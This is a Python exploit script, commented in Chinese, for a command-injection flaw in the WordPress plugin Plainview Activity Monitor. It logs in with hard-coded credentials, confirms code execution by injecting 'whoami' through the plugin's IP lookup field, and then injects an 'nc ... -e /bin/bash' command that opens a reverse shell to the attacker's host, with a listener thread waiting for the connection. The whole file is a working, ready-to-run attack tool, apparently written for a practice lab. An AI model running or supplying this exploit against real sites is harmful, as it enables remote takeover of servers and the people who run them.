import requests
from bs4 import BeautifulSoup
import os
import threading
from AuxiliaryFunc import AuxiliaryFunc, ListenonPort

"""
wordpress plainview_activity_monitor 20161228
RCE漏洞，未过滤用户输入
漏洞需要：已登录用户信息
漏洞产生：该插件提供了解析ip到域名的功能，如果服务器中可以使用dig，则会执行dig -x ip来解析（exec ('dig -x'.ip)） --> 用户输入可执行，可利用管道符执行命令 
"""

#多线程 加一个nc -lvvp
#功能化
class EXP50110(threading.Thread):
    def __init__(self, lhost, lport, rhost, rport):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
    
    def __get_usr_info(self):
        #self.username = input("username:")
        #self.passwd = input("passwd:")
        self.username = "mark"
        self.passwd = "helpdesk01"
        
    def __get_cookie(self):
        admin_url = "http://" + self.rhost + "/wp-login.php"
        self.__get_usr_info()
        data = {
            'log': self.username,
            'pwd': self.passwd,
            #wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1
            'wp-submit': 'Log In',
            'testcookie': 1
        }
        
        x = requests.post(admin_url, data = data)
        self.cookies = {}
        cookie = str(x.headers['Set-Cookie'])
        
        for i in cookie.split():
            if "wordpress" in i and "=" in i:
                self.cookies[i.split('=')[0]] = i.split('=')[1][:len(i.split('=')[1])-1]
        print(self.cookies)
        
            
    def __poc(self):
        self.url = "http://" + self.rhost + "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
        self.__get_cookie()
        data = {
            'ip': 'google.fr | whoami',
            'lookup': 'Lookup'
        }
        x = requests.post(self.url, data=data, cookies=self.cookies)
        #解析出whoami的执行结果
        html_doc = x.text.split("<p>Output from dig: </p>")[1]
        soup = BeautifulSoup(html_doc, "html.parser")
        whoami = soup.find('p').text
        print("[*]Exploit Succeed! ")
        self.__exploit(whoami)

    def __exploit(self, whoami):
        
        #发送exp
        data = {
            'ip': 'google.fr | nc {} {} -e /bin/bash'.format(self.lhost, self.lport),
            'lookup': 'Lookup'
        }
        
        requests.post(self.url, data=data, cookies=self.cookies)
        
    def run(self):
        self.__poc()
        
        print("exploit 结束")

class EXP:
    def __init__(self):
        aux = AuxiliaryFunc()
        self.rhost, self.rport = aux.target_ip_port()
        self.lhost, self.lport = aux.local_ip_port()
        
        self.__exploit()
        
    def __exploit(self):
        thread1 = EXP50110(self.lhost, self.lport, self.rhost, self.rport)
        thread2 = ListenonPort(self.lport)

        thread1.start()
        thread2.start()

        thread1.join()
        thread2.join()

        print("退出主线程")
